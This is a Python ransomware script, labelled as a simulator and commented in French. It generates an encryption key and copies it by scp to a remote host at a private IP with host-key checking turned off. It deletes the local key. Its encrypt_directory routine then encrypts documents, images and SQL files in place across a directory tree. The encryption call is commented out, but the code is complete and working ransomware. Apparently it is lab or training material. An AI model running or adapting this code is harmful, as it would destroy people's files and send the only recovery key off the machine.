#!/usr/bin/env python3
# RANSOMWARE SIMULATEUR - VERSION SSH PUR
import os
import sys
import subprocess
from cryptography.fernet import Fernet
from pathlib import Path

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
REMOTE_DIR = "/home/doranco/cle_dechiffrement"
KEY_FILE = "decryption_key.key"

class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.target_exts = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.sql'}
        
    def generate_key(self):
        """Génère une clé de chiffrement"""
        print("Génération de la clé...")
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        print(f"Clé générée: {self.key.decode()[:12]}...")
        return True

    def transfer_key_ssh(self):
        """Transfère la clé via SSH natif"""
        if not self.key:
            print("Aucune clé générée!")
            return False

        try:
            # Crée un fichier temporaire
            with open(KEY_FILE, 'wb') as f:
                f.write(self.key)
            
            # Crée le répertoire distant
            subprocess.run([
                'ssh',
                f'{SSH_USER}@{SSH_SERVER}',
                f'mkdir -p {REMOTE_DIR}'
            ], check=True)
            
            # Copie la clé via SCP
            subprocess.run([
                'scp',
                '-o', 'StrictHostKeyChecking=no',
                KEY_FILE,
                f'{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/{KEY_FILE}'
            ], check=True)
            
            # Supprime la clé locale
            os.remove(KEY_FILE)
            
            print(f"Clé transférée vers {SSH_SERVER}:{REMOTE_DIR}/{KEY_FILE}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"Échec du transfert SSH: {e}")
            return False

    def encrypt_file(self, filepath):
        """Chiffre un fichier"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            encrypted = self.cipher.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
            
            return True
        except Exception as e:
            print(f"Erreur sur {filepath}: {e}")
            return False

    def encrypt_directory(self, path='.'):
        """Chiffre un dossier"""
        encrypted = errors = 0
        
        for root, _, files in os.walk(path):
            for file in files:
                if Path(file).suffix.lower() in self.target_exts:
                    if self.encrypt_file(os.path.join(root, file)):
                        encrypted += 1
                    else:
                        errors += 1
        
        print(f"Terminé! {encrypted} fichiers chiffrés, {errors} erreurs")

if __name__ == '__main__':
    try:
        # Vérifie que SSH est installé
        subprocess.run(['ssh', '-V'], capture_output=True, check=True)
        
        sim = RansomwareSimulator()
        if sim.generate_key():
            if sim.transfer_key_ssh():
                print("Opération réussie!")
                # sim.encrypt_directory('/chemin/à/chiffrer')  # Décommentez pour activer
    except subprocess.CalledProcessError:
        print("Erreur: SSH doit être installé")
        print("Installez-le avec: sudo apt install openssh-client")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nOpération annulée")
        sys.exit(0)